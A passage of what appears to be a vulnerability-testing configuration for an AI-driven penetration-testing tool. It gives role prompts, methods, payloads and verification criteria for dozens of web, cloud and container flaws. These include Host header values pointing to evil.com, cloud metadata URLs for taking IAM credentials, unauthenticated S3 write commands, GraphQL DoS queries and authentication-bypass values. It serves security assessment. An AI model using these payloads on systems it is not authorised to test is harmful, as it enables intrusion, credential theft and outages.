        "false_positive_indicators": "Input is part of cache key. Cache not shared between users. Vary header includes the input. Short cache TTL.",
        "technology_hints": {"general": "Target: Varnish, CloudFlare, Fastly, Akamai, Nginx proxy_cache. Use Param Miner Burp extension methodology."}
    },

    # ===== LOGIC & DATA (68-83) =====

    "race_condition": {
        "role": "You are a race condition specialist.",
        "detection_strategy": "Exploit time-of-check to time-of-use (TOCTOU) gaps by sending concurrent requests to bypass limits or duplicate operations.",
        "test_methodology": "1. Identify operations with limits (one coupon use, one vote, balance check). 2. Send 10-50 concurrent identical requests. 3. Check if operation executed multiple times. 4. Test with: coupon redemption, fund transfer, file operations.",
        "payload_selection": "Send 20+ simultaneous requests using asyncio/concurrent connections. Target: POST /api/redeem-coupon, POST /api/transfer, POST /api/vote. Use HTTP/2 single-packet attack for precision.",
        "verification_criteria": "CONFIRMED if: operation succeeds more times than allowed (coupon used twice, balance went negative, multiple votes counted).",
        "exploitation_guidance": "Document: endpoint, number of concurrent requests, number of successful executions, and impact (financial, logical).",
        "false_positive_indicators": "Proper database locking. Idempotency keys enforced. Request deduplication. Only one request succeeds.",
        "technology_hints": {"general": "Use HTTP/2 single-packet technique for precision. Test: inventory, coupons, votes, transfers, file operations."}
    },

    "business_logic": {
        "role": "You are a business logic vulnerability specialist.",
        "detection_strategy": "Find flaws in application workflow logic that allow bypassing intended business rules (price manipulation, workflow skip, feature abuse).",
        "test_methodology": "1. Map application workflows (purchase, registration, approval). 2. Try skipping steps. 3. Manipulate prices/quantities (negative values, zero, decimals). 4. Test boundary conditions. 5. Abuse intended features for unintended purposes.",
        "payload_selection": "Price: -1, 0, 0.01, 99999999. Quantity: -1, 0, MAX_INT. Skip checkout steps. Modify hidden fields. Apply coupon multiple times. Transfer negative amounts.",
        "verification_criteria": "CONFIRMED if: business rule bypassed (free purchase, negative transfer, workflow skip), with actual server-side impact (not just UI).",
        "exploitation_guidance": "Document: intended workflow, bypass method, and actual impact (financial loss, privilege gain). Show server responses confirming bypass.",
        "false_positive_indicators": "Server validates all business rules. Client-side only changes. Operations roll back on validation failure.",
        "technology_hints": {"general": "Target: e-commerce (price/quantity), banking (transfers), SaaS (plan limits), multi-step workflows (step skipping)"}
    },

    "rate_limit_bypass": {
        "role": "You are a rate limiting bypass specialist.",
        "detection_strategy": "Test rate limiting mechanisms and find bypasses to perform brute force, scraping, or abuse at scale.",
        "test_methodology": "1. Identify rate-limited endpoints. 2. Test bypass via: X-Forwarded-For rotation, API versioning (/v1/ vs /v2/), case change, parameter pollution. 3. Test IP rotation. 4. Check if rate limit is per-IP, per-user, or per-session.",
        "payload_selection": "X-Forwarded-For: 1.2.3.{N} (rotate) X-Real-IP: different values. Try: /API/login vs /api/login. Add null byte: /api/login%00. Change HTTP method. Distribute across endpoints.",
        "verification_criteria": "CONFIRMED if: rate limit bypassed using header manipulation, path variation, or other technique, allowing unlimited requests.",
        "exploitation_guidance": "Document: rate limit configuration, bypass technique, and demonstrated unlimited access.",
        "false_positive_indicators": "Rate limit properly enforced regardless of headers. No rate limit exists (feature not implemented). Rate limit per-user not per-IP.",
        "technology_hints": {"general": "Check: X-Forwarded-For trust, path normalization, case sensitivity, API gateway vs app-level rate limiting"}
    },

    "parameter_pollution": {
        "role": "You are an HTTP parameter pollution specialist.",
        "detection_strategy": "Send duplicate parameters to exploit different parsing between front-end and back-end, or to bypass validation.",
        "test_methodology": "1. Send duplicate params: ?user=admin&user=victim. 2. Test different formats: user=admin,victim. 3. Check which value the server uses (first, last, array). 4. Test for WAF bypass via duplicate params. 5. Test JSON pollution.",
        "payload_selection": "?param=safe&param=malicious ?param=value1,value2 ?param[]=a&param[]=b JSON: {\"role\":\"user\",\"role\":\"admin\"} ?id=1&id=2",
        "verification_criteria": "CONFIRMED if: duplicate parameters cause different behavior than single parameter, leading to: auth bypass, WAF bypass, or data manipulation.",
        "exploitation_guidance": "Document: polling behavior (first wins, last wins, concatenated), and the exploit (WAF bypass, logic bypass).",
        "false_positive_indicators": "Server consistently uses first/last value. No behavioral difference. Parameters properly deduplicated.",
        "technology_hints": {"php": "PHP uses last value", "aspnet": "ASP.NET concatenates with comma", "node": "Express returns array", "python": "Flask uses first value"}
    },

    "type_juggling": {
        "role": "You are a type juggling/coercion specialist.",
        "detection_strategy": "Exploit loose type comparison in languages like PHP to bypass authentication or other security checks.",
        "test_methodology": "1. Test PHP loose comparison: send 0 instead of string password (0 == 'string' is true in PHP). 2. Test: null, true, 0, [], '0e123' (magic hashes). 3. Test JSON type manipulation (string vs int). 4. Test JavaScript == vs ===.",
        "payload_selection": "Password: 0, true, [], null, '0e462097431906509019562988736854' (md5 of 240610708 starts with 0e). JSON: {\"password\":0} {\"password\":true} {\"password\":[]}",
        "verification_criteria": "CONFIRMED if: authentication bypassed or security check circumvented by sending unexpected type (int 0 instead of string, true instead of password).",
        "exploitation_guidance": "Document: comparison flaw, type sent, and resulting bypass. Show authentication success with type-juggled value.",
        "false_positive_indicators": "Strict comparison (===) used. Type validation on input. Password properly hashed before comparison.",
        "technology_hints": {"php": "== vs === comparison. Magic hashes: md5('240610708') starts with 0e. json_decode returns int for 0.", "node": "== vs === in JavaScript"}
    },

    "insecure_deserialization": {
        "role": "You are an insecure deserialization specialist.",
        "detection_strategy": "Find endpoints that deserialize user-controlled data (Java serialization, PHP unserialize, Python pickle, .NET BinaryFormatter) to achieve RCE.",
        "test_methodology": "1. Identify serialized data: Java (base64 rO0AB), PHP (a:, O:, s: patterns), Python (__reduce__). 2. Check cookies, hidden fields, API parameters. 3. Generate PoC payload with gadget chain. 4. Test with DNS callback payload first.",
        "payload_selection": "Java: ysoserial CommonsCollections payload. PHP: serialize object with __wakeup/__destruct. Python: pickle.loads exploit. .NET: BinaryFormatter/ObjectStateFormatter payload.",
        "verification_criteria": "CONFIRMED if: deserialization payload triggers callback (DNS/HTTP), OR command execution, OR application state changed.",
        "exploitation_guidance": "Document: serialization format, gadget chain used, and execution proof (callback received, command output).",
        "false_positive_indicators": "Data not actually deserialized. Deserialization type-restricted. No usable gadget chains in classpath.",
        "technology_hints": {"java": "Check for ObjectInputStream.readObject(), base64-encoded rO0AB...", "php": "Check for unserialize() with user input", "python": "Check for pickle.loads(), yaml.load()", "dotnet": "Check for BinaryFormatter, TypeNameHandling.All in JSON.NET"}
    },

    "subdomain_takeover": {
        "role": "You are a subdomain takeover specialist.",
        "detection_strategy": "Find dangling DNS records (CNAME, A) pointing to unclaimed cloud services that can be registered by an attacker.",
        "test_methodology": "1. Enumerate subdomains. 2. Check DNS records for CNAME to cloud services (S3, Azure, Heroku, GitHub Pages). 3. Verify if the target resource is unclaimed. 4. Check for error pages indicating unclaimed resource. 5. Attempt to claim the resource.",
        "payload_selection": "Check CNAME records for: *.s3.amazonaws.com, *.azurewebsites.net, *.herokuapp.com, *.github.io, *.cloudfront.net, *.pantheonsite.io, *.ghost.io",
        "verification_criteria": "CONFIRMED if: subdomain CNAME points to unclaimed cloud resource (404/error from cloud provider), AND attacker can register the resource to serve content.",
        "exploitation_guidance": "Document: subdomain, CNAME target, cloud provider, and proof that resource is claimable. DO NOT actually claim production resources without authorization.",
        "false_positive_indicators": "Resource is claimed (returns content). CNAME target is active. DNS record recently updated. Provider requires domain verification.",
        "technology_hints": {"general": "Fingerprints: 'NoSuchBucket' (S3), 'There isn\\'t a GitHub Pages site here' (GitHub), 'herokucdn.com/error-pages' (Heroku)"}
    },

    "host_header_injection": {
        "role": "You are a Host header injection specialist.",
        "detection_strategy": "Manipulate the Host header to poison password reset links, access virtual hosts, or bypass access controls.",
        "test_methodology": "1. Send request with Host: evil.com. 2. Check if Host value appears in response (links, redirects). 3. Test password reset with modified Host header. 4. Try X-Forwarded-Host override. 5. Test for virtual host routing bypass.",
        "payload_selection": "Host: evil.com Host: target.com:evil.com@evil.com Host: evil.com%0d%0aX-Injected:true X-Forwarded-Host: evil.com X-Host: evil.com",
        "verification_criteria": "CONFIRMED if: Host header value used in generated links (password reset URL points to evil.com), OR virtual host routing bypassed, OR cache poisoned.",
        "exploitation_guidance": "Document: injected Host value, resulting link/behavior change, and impact (password reset token theft, cache poisoning).",
        "false_positive_indicators": "Host header validated/ignored. Password reset uses hardcoded base URL. Virtual hosts properly isolated.",
        "technology_hints": {"python": "Django: request.get_host(), ALLOWED_HOSTS setting", "php": "$_SERVER['HTTP_HOST'] usage", "general": "Password reset token theft is the primary exploit."}
    },

    "timing_attack": {
        "role": "You are a timing attack specialist.",
        "detection_strategy": "Measure response time differences to extract secrets (valid usernames, passwords character by character, HMAC comparison).",
        "test_methodology": "1. Test username enumeration: measure response time for valid vs invalid usernames. 2. Test token/HMAC comparison: measure response for first-char-correct vs all-wrong. 3. Send 100+ requests to get statistical significance. 4. Use median timing to reduce jitter.",
        "payload_selection": "Username timing: valid_user vs aaaaaa (measure ms difference). Token timing: correct_first_char vs wrong_first_char. Statistical: 100+ requests per variant, use median.",
        "verification_criteria": "CONFIRMED if: statistically significant timing difference (>2 standard deviations) between valid/invalid inputs across 100+ measurements.",
        "exploitation_guidance": "Document: timing measurements, statistical analysis, and information extracted (valid usernames, token characters).",
        "false_positive_indicators": "Network jitter larger than timing difference. Constant-time comparison used. Rate limiting interferes with measurement.",
        "technology_hints": {"general": "Target: string comparison (==) vs constant-time (hmac.compare_digest). Local network testing reduces jitter."}
    },

    "improper_error_handling": {
        "role": "You are an improper error handling specialist.",
        "detection_strategy": "Trigger error conditions to find verbose error messages that disclose internal information (stack traces, paths, database details, config).",
        "test_methodology": "1. Send malformed input to trigger errors. 2. Request non-existent pages. 3. Send oversized requests. 4. Use unexpected content types. 5. Check for framework-specific error pages. 6. Analyze error messages for sensitive data.",
        "payload_selection": "Invalid input types (string where int expected). Very long strings (10000+ chars). Special characters (null bytes, unicode). Missing required parameters. Invalid JSON/XML. Division by zero.",
        "verification_criteria": "CONFIRMED if: error response contains: source code paths, database connection strings, stack traces with line numbers, framework versions, internal IP addresses.",
        "exploitation_guidance": "Document: trigger condition and all sensitive information disclosed in error messages.",
        "false_positive_indicators": "Generic error pages. Custom error handlers. Error details only in logs (not response). Expected error messages (validation).",
        "technology_hints": {"php": "display_errors, xdebug output", "python": "Django DEBUG=True, Flask debug mode", "java": "Stack traces in JSP/Spring error pages", "node": "Express default error handler"}
    },

    "sensitive_data_exposure": {
        "role": "You are a sensitive data exposure specialist.",
        "detection_strategy": "Find sensitive data (PII, credentials, tokens, financial data) exposed in responses, URLs, client-side storage, or public files.",
        "test_methodology": "1. Analyze API responses for over-exposure (password hashes, tokens, PII). 2. Check URLs for sensitive data (tokens in query params). 3. Check localStorage/sessionStorage. 4. Check for sensitive data in HTML comments. 5. Review JavaScript files for embedded secrets.",
        "payload_selection": "N/A - inspection-based. Check: API responses for extra fields, HTML source comments, JS files for API keys, localStorage for tokens, URL parameters for sensitive data.",
        "verification_criteria": "CONFIRMED if: sensitive data (passwords, tokens, PII, financial data) exposed to unauthorized viewers or in insecure channels.",
        "exploitation_guidance": "Document: type of sensitive data, location (response, URL, storage), and who can access it. Screenshot the exposure.",
        "false_positive_indicators": "Data intended to be public. User viewing their own data. Encrypted/hashed values. Test/dummy data.",
        "technology_hints": {"general": "Check: API responses (hidden fields), GraphQL (over-fetching), HTML comments, JS bundles (source maps), HTTP Referer header leaking tokens"}
    },

    "information_disclosure": {
        "role": "You are an information disclosure specialist.",
        "detection_strategy": "Find unintended information leaks: server versions, internal paths, debug info, technology stack details, source code comments.",
        "test_methodology": "1. Check Server header for version. 2. Check X-Powered-By header. 3. Trigger errors for path disclosure. 4. Check robots.txt, sitemap.xml. 5. Check HTML comments for developer notes. 6. Check .git, .svn exposure.",
        "payload_selection": "Check: Server header, X-Powered-By, X-AspNet-Version. /.git/config, /.svn/entries, /.env, /robots.txt, /sitemap.xml, /crossdomain.xml, /clientaccesspolicy.xml",
        "verification_criteria": "CONFIRMED if: internal information disclosed (server version, source paths, developer comments, technology stack) that aids further attacks.",
        "exploitation_guidance": "Document: each disclosure, location, and how it could aid further attacks.",
        "false_positive_indicators": "Intentionally public information. Generic server headers. Version info not specific enough to be useful.",
        "technology_hints": {"general": "Check: Git exposure (.git/HEAD), SVN (.svn/entries), env files (.env), DS_Store, .idea/, node_modules/"}
    },

    "api_key_exposure": {
        "role": "You are an API key exposure specialist.",
        "detection_strategy": "Find API keys, secrets, and tokens hardcoded in client-side code, public repositories, or exposed endpoints.",
        "test_methodology": "1. Search JavaScript files for: api_key, apiKey, secret, token, password patterns. 2. Check source maps for server-side code. 3. Check environment variable exposure. 4. Verify found keys are valid by testing API calls.",
        "payload_selection": "Search patterns: /api[_-]?key/i, /secret/i, /token/i, /password/i, /AWS_/i, /PRIVATE_KEY/i, /sk_live_/i (Stripe), /AIza/i (Google)",
        "verification_criteria": "CONFIRMED if: valid API key found in client-side code that provides unauthorized access or incurs costs.",
        "exploitation_guidance": "Document: key type, location, and permissions (test API call to verify). Show what access the key provides. DO NOT abuse keys.",
        "false_positive_indicators": "Public/read-only API keys (intended for client-side). Expired/revoked keys. Test/sandbox keys. Restricted-scope keys.",
        "technology_hints": {"general": "Common locations: JS bundles, .env files, git history, source maps, HTML meta tags, mobile app binaries"}
    },

    "source_code_disclosure": {
        "role": "You are a source code disclosure specialist.",
        "detection_strategy": "Find exposed source code through misconfigured servers, backup files, version control exposure, or source maps.",
        "test_methodology": "1. Check for .git exposure: /.git/config, /.git/HEAD. 2. Check for source maps: /app.js.map. 3. Check for backup files: index.php.bak, config.php~. 4. Try file extension manipulation: .php → .phps, .txt. 5. Check for directory listing of source dirs.",
        "payload_selection": "/.git/config /.git/HEAD /.svn/entries /app.js.map /main.js.map /index.php.bak /config.php~ /web.config.old /backup.zip /.DS_Store",
        "verification_criteria": "CONFIRMED if: source code accessible (Git repo cloneable, source maps reveal server code, backup files contain source).",
        "exploitation_guidance": "Document: source code location, type, and sensitive content found (credentials, logic, vulnerabilities). Use for white-box analysis.",
        "false_positive_indicators": "Source maps for public open-source code. Git repo intentionally public. Backup files don't contain sensitive data.",
        "technology_hints": {"general": "GitTools for .git extraction, source-map-explorer for JS maps, common backup extensions: .bak, .old, .orig, ~, .swp"}
    },

    "backup_file_exposure": {
        "role": "You are a backup file exposure specialist.",
        "detection_strategy": "Find exposed backup files, database dumps, and configuration backups that contain sensitive data.",
        "test_methodology": "1. Check common backup paths: /backup.sql, /db.sql, /backup.zip, /site.tar.gz. 2. Try filename variations: index.php.bak, web.config.bak. 3. Check for automated backup directories: /backups/, /dump/. 4. Check for database export files.",
        "payload_selection": "/backup.sql /dump.sql /database.sql /backup.zip /backup.tar.gz /site.zip /db_backup.sql /backup/latest.sql /*.sql /wp-content/backup-*",
        "verification_criteria": "CONFIRMED if: backup file downloadable containing source code, database dumps, or configuration with credentials.",
        "exploitation_guidance": "Document: backup file URL, type, and sensitive contents (credentials, user data, source code).",
        "false_positive_indicators": "404 on all backup paths. Backup directory requires auth. Files are encrypted.",
        "technology_hints": {"general": "Common CMS backup plugins create predictable paths. Check: UpdraftPlus (/wp-content/updraft/), phpMyAdmin exports, mongodump files"}
    },

    "version_disclosure": {
        "role": "You are a version disclosure specialist.",
        "detection_strategy": "Identify specific software versions that map to known CVEs, enabling targeted exploitation.",
        "test_methodology": "1. Check headers: Server, X-Powered-By, X-AspNet-Version. 2. Check meta generators: <meta name='generator'>. 3. Check /readme.html, /CHANGELOG, /VERSION. 4. Fingerprint via response patterns. 5. Check JavaScript library versions.",
        "payload_selection": "Check: /readme.html /CHANGELOG.md /VERSION /license.txt. Headers: Server, X-Powered-By. HTML: meta generator. JS: jQuery.fn.jquery, angular.version, React.version",
        "verification_criteria": "CONFIRMED if: specific software version identified that has known CVEs, providing a clear attack vector.",
        "exploitation_guidance": "Document: software name, version, source of disclosure, and mapped CVEs. Cross-reference with exploit databases.",
        "false_positive_indicators": "Version is latest (no known CVEs). Generic version without specific patch level. Version info is fabricated/honeypot.",
        "technology_hints": {"general": "Cross-reference: CVE databases, exploit-db, Vulners. Focus on: WordPress, jQuery, Apache, PHP, nginx versions"}
    },

    # ===== CRYPTO & SUPPLY (84-91) =====

    "weak_encryption": {
        "role": "You are a cryptographic weakness specialist.",
        "detection_strategy": "Identify weak encryption algorithms (DES, 3DES, RC4, ECB mode) used to protect sensitive data in transit or at rest.",
        "test_methodology": "1. Check TLS cipher suites for weak algorithms. 2. Analyze encrypted data for patterns (ECB mode produces identical blocks). 3. Check for custom/homebrew encryption. 4. Check key sizes (< 128-bit symmetric, < 2048-bit RSA).",
        "payload_selection": "N/A - inspection-based. Analyze: TLS handshake, encrypted cookies, API tokens, file encryption.",
        "verification_criteria": "CONFIRMED if: weak algorithm identified in use for sensitive data (DES, RC4, ECB mode AES, < 2048-bit RSA, MD5 for password hashing).",
        "exploitation_guidance": "Document: algorithm used, context, key size, and practical attack (ECB pattern analysis, known-plaintext for RC4).",
        "false_positive_indicators": "Strong algorithms in use. Weak cipher available but not preferred. Legacy support with proper fallback. Non-sensitive data encrypted.",
        "technology_hints": {"general": "Check: openssl s_client output, response patterns for ECB, JWT 'alg' header, bcrypt/scrypt for passwords"}
    },

    "weak_hashing": {
        "role": "You are a weak hashing detection specialist.",
        "detection_strategy": "Identify use of weak hash algorithms (MD5, SHA1) for security-critical purposes like password storage or integrity verification.",
        "test_methodology": "1. Check if password hashes are exposed (API responses, database dumps, error messages). 2. Identify hash format: MD5 (32 hex), SHA1 (40 hex), bcrypt ($2b$). 3. Check for unsalted hashes. 4. Test if hash collisions possible.",
        "payload_selection": "N/A - inspection-based. Look for: 32-char hex strings (MD5), 40-char hex (SHA1), check if same input produces same hash (no salt).",
        "verification_criteria": "CONFIRMED if: MD5/SHA1 used for password storage (identifiable by hash length/format), OR unsalted hashes (same password = same hash).",
        "exploitation_guidance": "Document: hash algorithm, context (passwords, tokens), and demonstrate weakness (rainbow table lookup, hash collision).",
        "false_positive_indicators": "Hash used for non-security purposes (caching, checksums). bcrypt/scrypt/argon2 in use. Salted hashes.",
        "technology_hints": {"general": "Safe: bcrypt, scrypt, argon2. Unsafe for passwords: MD5, SHA1, SHA256 without salt. Check: password reset tokens, session IDs"}
    },

    "weak_random": {
        "role": "You are a weak randomness detection specialist.",
        "detection_strategy": "Identify predictable random number generation used for security tokens, session IDs, or password reset codes.",
        "test_methodology": "1. Collect 100+ tokens/session IDs. 2. Analyze for patterns (sequential, timestamp-based, low entropy). 3. Check if tokens are predictable (next token from previous). 4. Check reset code entropy (4-digit vs UUID).",
        "payload_selection": "Collect: 100 session IDs, 20 password reset tokens, CSRF tokens. Analyze: entropy, patterns, predictability. Test: can next value be predicted?",
        "verification_criteria": "CONFIRMED if: tokens predictable (sequential, timestamp-based), OR low entropy (4-digit reset codes), OR same seed produces same sequence.",
        "exploitation_guidance": "Document: token generation weakness, analysis of collected tokens, and demonstrated prediction of future tokens.",
        "false_positive_indicators": "UUID v4 used (128-bit random). Cryptographic PRNG. High entropy tokens. Tokens expire quickly.",
        "technology_hints": {"php": "rand()/mt_rand() vs random_bytes()", "python": "random vs secrets module", "java": "java.util.Random vs SecureRandom", "node": "Math.random() vs crypto.randomBytes()"}
    },

    "cleartext_transmission": {
        "role": "You are a cleartext transmission specialist.",
        "detection_strategy": "Identify sensitive data transmitted over unencrypted HTTP connections, including mixed content on HTTPS pages.",
        "test_methodology": "1. Check if site accessible via HTTP (no redirect to HTTPS). 2. Check for mixed content (HTTPS page loading HTTP resources). 3. Check if credentials submitted over HTTP. 4. Check for HSTS. 5. Check API endpoints for HTTP access.",
        "payload_selection": "N/A - inspection-based. Access site via http://, check for redirect. Check login form action URL. Check HSTS header. Check mixed content warnings.",
        "verification_criteria": "CONFIRMED if: sensitive data (credentials, tokens, PII) transmitted over HTTP, OR login form submits to HTTP endpoint, OR no HTTP→HTTPS redirect.",
        "exploitation_guidance": "Document: HTTP endpoints handling sensitive data, missing HSTS, and mixed content issues.",
        "false_positive_indicators": "HTTP redirects to HTTPS. HSTS deployed. No sensitive data on HTTP pages. Internal/development only.",
        "technology_hints": {"general": "Check: login forms, API endpoints, cookie Secure flag, HSTS preload, mixed content, internal API calls"}
    },

    "vulnerable_dependency": {
        "role": "You are a vulnerable dependency detection specialist.",
        "detection_strategy": "Identify third-party libraries and frameworks with known CVEs that could be exploited.",
        "test_methodology": "1. Fingerprint JavaScript libraries (jQuery, Angular, React versions). 2. Check package.json, requirements.txt, pom.xml if exposed. 3. Cross-reference versions with CVE databases. 4. Check for exploit availability. 5. Verify exploitability in context.",
        "payload_selection": "Fingerprint: jQuery.fn.jquery, angular.version.full, React.version. Check: /package.json, /composer.json, /Gemfile.lock. CVE lookup: NVD, Snyk, npm audit.",
        "verification_criteria": "CONFIRMED if: library version with known exploitable CVE identified, AND vulnerability is applicable to how the library is used.",
        "exploitation_guidance": "Document: library, version, CVE, and proof of exploitability. Demonstrate if PoC exploit works in context.",
        "false_positive_indicators": "CVE not applicable to usage context. Patched via backport. Mitigating controls in place. CVE is low severity/theoretical.",
        "technology_hints": {"general": "Check: npm audit, pip-audit, OWASP Dependency-Check, Retire.js for JavaScript"}
    },

    "outdated_component": {
        "role": "You are an outdated software component specialist.",
        "detection_strategy": "Identify significantly outdated software components (CMS, frameworks, servers) that may have multiple known vulnerabilities.",
        "test_methodology": "1. Fingerprint CMS version (WordPress, Drupal, Joomla). 2. Check server software version. 3. Identify framework version. 4. Compare with current stable release. 5. List CVEs for the identified version.",
        "payload_selection": "WordPress: /readme.html, /wp-includes/version.php. Drupal: /CHANGELOG.txt. Joomla: /administrator/manifests/files/joomla.xml. Generic: Server header, X-Powered-By.",
        "verification_criteria": "CONFIRMED if: software version is significantly outdated (2+ major versions behind or known critical CVEs), with exploitable vulnerabilities.",
        "exploitation_guidance": "Document: component, version, current version, and CVE list. Demonstrate critical exploits if applicable.",
        "false_positive_indicators": "Component is latest version. Version only slightly behind. Long-term support branch with backported patches.",
        "technology_hints": {"general": "Focus on: WordPress + plugins, jQuery, Apache/nginx, PHP, framework versions. Use Wappalyzer-style fingerprinting."}
    },

    "insecure_cdn": {
        "role": "You are a CDN/third-party resource security specialist.",
        "detection_strategy": "Identify insecure loading of third-party resources without Subresource Integrity (SRI) hashes, enabling supply chain attacks.",
        "test_methodology": "1. Find external script/CSS includes (CDN libraries). 2. Check for integrity= attribute (SRI). 3. Check for crossorigin attribute. 4. Verify CDN HTTPS usage. 5. Check for deprecated/unmaintained CDN sources.",
        "payload_selection": "N/A - inspection-based. Check: <script src='cdn...'> without integrity attribute. Look for: cdnjs, unpkg, jsdelivr, googleapis CDN includes.",
        "verification_criteria": "CONFIRMED if: critical JavaScript loaded from third-party CDN without SRI hash, meaning CDN compromise could inject malicious code.",
        "exploitation_guidance": "Document: external resources without SRI, potential impact of CDN compromise, and recommended integrity hashes.",
        "false_positive_indicators": "SRI hashes present. Self-hosted resources. Non-critical resources (fonts, images). CSP restricts execution.",
        "technology_hints": {"general": "Generate SRI: shasum -b -a 384 script.js | xxd -r -p | base64. Tools: srihash.org"}
    },

    "container_escape": {
        "role": "You are a container security specialist.",
        "detection_strategy": "Detect container misconfigurations that could allow escape from containerized environments to the host system.",
        "test_methodology": "1. Check if running in container (/.dockerenv, /proc/1/cgroup). 2. Check for privileged mode. 3. Check mounted Docker socket. 4. Check for sensitive host mounts. 5. Check capabilities (CAP_SYS_ADMIN). 6. Check for kernel exploits.",
        "payload_selection": "cat /.dockerenv, cat /proc/1/cgroup (container detection). ls -la /var/run/docker.sock (Docker socket). mount | grep 'type cgroup' capsh --print (capabilities).",
        "verification_criteria": "CONFIRMED if: container running in privileged mode, OR Docker socket mounted, OR sensitive host paths accessible from container.",
        "exploitation_guidance": "Document: container runtime, misconfigurations found, and potential escape path. DO NOT actually escape without authorization.",
        "false_positive_indicators": "Container properly isolated. No privileged mode. No sensitive mounts. Seccomp/AppArmor profiles enforced.",
        "technology_hints": {"general": "Docker: --privileged flag, -v /:/host, Docker socket mount. Kubernetes: hostPID, hostNetwork, privileged pods."}
    },

    # ===== CLOUD & API (92-100) =====

    "s3_bucket_misconfiguration": {
        "role": "You are an S3/cloud storage misconfiguration specialist.",
        "detection_strategy": "Find misconfigured cloud storage buckets (S3, GCS, Azure Blob) with public read/write access or overly permissive ACLs.",
        "test_methodology": "1. Discover bucket names from: subdomains, HTML source, JS files, DNS records. 2. Test public read: aws s3 ls s3://bucket-name. 3. Test public write: aws s3 cp test.txt s3://bucket-name/. 4. Check bucket policies. 5. Test authenticated user access.",
        "payload_selection": "aws s3 ls s3://BUCKET --no-sign-request (unauthenticated read). aws s3 cp test.txt s3://BUCKET/ --no-sign-request (unauthenticated write). curl http://BUCKET.s3.amazonaws.com/",
        "verification_criteria": "CONFIRMED if: bucket contents listable by unauthenticated user, OR files downloadable/writable without proper credentials.",
        "exploitation_guidance": "Document: bucket name, public access level (read/write/list), and sensitive files found. DO NOT download/modify production data.",
        "false_positive_indicators": "Intentionally public bucket (static website hosting). Bucket policy requires auth. Access denied on listing.",
        "technology_hints": {"aws": "Check: S3 Block Public Access settings, bucket policies, ACLs", "gcp": "gsutil ls gs://bucket", "azure": "az storage blob list --container-name CONTAINER"}
    },

    "cloud_metadata_exposure": {
        "role": "You are a cloud metadata exposure specialist.",
        "detection_strategy": "Access cloud instance metadata services to extract credentials, configuration, and infrastructure details.",
        "test_methodology": "1. Test via SSRF: http://169.254.169.254/. 2. Check for exposed metadata proxy. 3. Test IMDSv1 vs IMDSv2 (AWS). 4. Extract IAM role credentials. 5. Check for user-data scripts with secrets.",
        "payload_selection": "AWS: http://169.254.169.254/latest/meta-data/ GCP: http://metadata.google.internal/computeMetadata/v1/ Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "verification_criteria": "CONFIRMED if: metadata endpoint accessible (directly or via SSRF), returning instance details, IAM credentials, or user-data.",
        "exploitation_guidance": "Extract IAM credentials, instance identity, user-data. Document: access method and data obtained.",
        "false_positive_indicators": "IMDSv2 enforced (requires token). Metadata endpoint blocked. Not in cloud environment.",
        "technology_hints": {"aws": "IMDSv2: PUT /latest/api/token first", "gcp": "Requires Metadata-Flavor: Google header", "azure": "Requires Metadata: true header"}
    },

    "serverless_misconfiguration": {
        "role": "You are a serverless security specialist.",
        "detection_strategy": "Find misconfigurations in serverless functions (Lambda, Cloud Functions, Azure Functions) like excessive permissions, exposed endpoints, or environment variable leaks.",
        "test_methodology": "1. Discover function endpoints. 2. Test for unauthenticated access. 3. Check for environment variable exposure (error messages). 4. Test for event injection. 5. Check for excessive IAM permissions.",
        "payload_selection": "Access function URL directly. Trigger errors to expose env vars. Inject event data: {\"key\":\"{{payload}}\"}. Check for debug/verbose mode.",
        "verification_criteria": "CONFIRMED if: serverless function accessible without auth, OR environment variables (secrets) exposed, OR excessive permissions exploitable.",
        "exploitation_guidance": "Document: function endpoint, access level, exposed secrets, and exploitable permissions.",
        "false_positive_indicators": "Function properly authenticated. Env vars not in responses. Minimal IAM permissions. API Gateway authorization.",
        "technology_hints": {"aws": "Lambda function URLs, API Gateway auth, IAM role permissions", "gcp": "Cloud Functions --allow-unauthenticated", "azure": "Function App authentication settings"}
    },

    "graphql_introspection": {
        "role": "You are a GraphQL introspection exposure specialist.",
        "detection_strategy": "Check if GraphQL introspection is enabled in production, exposing the complete API schema including private types and fields.",
        "test_methodology": "1. Send introspection query: {__schema{types{name,fields{name}}}}. 2. Check for full type system exposure. 3. Identify sensitive types (User, Admin, Payment). 4. Check for deprecated fields with sensitive data. 5. Map all mutations.",
        "payload_selection": "{__schema{queryType{name},mutationType{name},types{name,kind,fields{name,type{name,kind,ofType{name}}}}}} {__type(name:\"User\"){fields{name,type{name}}}}",
        "verification_criteria": "CONFIRMED if: full schema returned with type definitions, field names, and mutation operations. Focus on production environments.",
        "exploitation_guidance": "Document: full schema dump, sensitive types/fields found, and unauthorized mutations available.",
        "false_positive_indicators": "Introspection intentionally enabled (public API). Dev environment only. Schema doesn't reveal sensitive operations.",
        "technology_hints": {"general": "Apollo Server: introspection: false in production. Hasura: disable via HASURA_GRAPHQL_ENABLE_ALLOWLIST. Check /graphql and /graphiql endpoints."}
    },

    "graphql_dos": {
        "role": "You are a GraphQL denial of service specialist.",
        "detection_strategy": "Test for GraphQL-specific DoS via deeply nested queries, batch queries, or resource-intensive operations.",
        "test_methodology": "1. Test deeply nested queries (10+ levels). 2. Test query batching (100+ queries in one request). 3. Test field duplication (__typename repeated 1000x). 4. Check for query complexity/depth limits. 5. Test alias-based attacks.",
        "payload_selection": "Nested: {user{posts{comments{author{posts{comments{author...}}}}}}} Batch: [{query:\"...\"},{query:\"...\"},...] x100. Aliases: {a1:__typename a2:__typename ... a1000:__typename}",
        "verification_criteria": "CONFIRMED if: deeply nested or batched queries cause significant server slowdown (>5s response time), OR no query complexity limits enforced.",
        "exploitation_guidance": "Document: query complexity that causes slowdown, missing depth/complexity limits, and server impact.",
        "false_positive_indicators": "Query depth limited (error returned). Complexity analysis rejects expensive queries. Timeout configured. Rate limiting on GraphQL endpoint.",
        "technology_hints": {"general": "Check: graphql-depth-limit, graphql-query-complexity, persisted queries, query whitelisting"}
    },

    "rest_api_versioning": {
        "role": "You are a REST API versioning security specialist.",
        "detection_strategy": "Test if older API versions with weaker security controls are still accessible alongside newer versions.",
        "test_methodology": "1. Identify API version pattern (/v1/, /v2/, /api/v1/). 2. Test older versions: /v1/ if current is /v3/. 3. Check if old versions lack auth/rate-limiting. 4. Compare security controls between versions. 5. Check for deprecated endpoints with known vulns.",
        "payload_selection": "/api/v1/users (if current is /api/v3/users). /v0/endpoint, /v1/endpoint, /api/1.0/endpoint. Check: authentication, authorization, rate limiting on each version.",
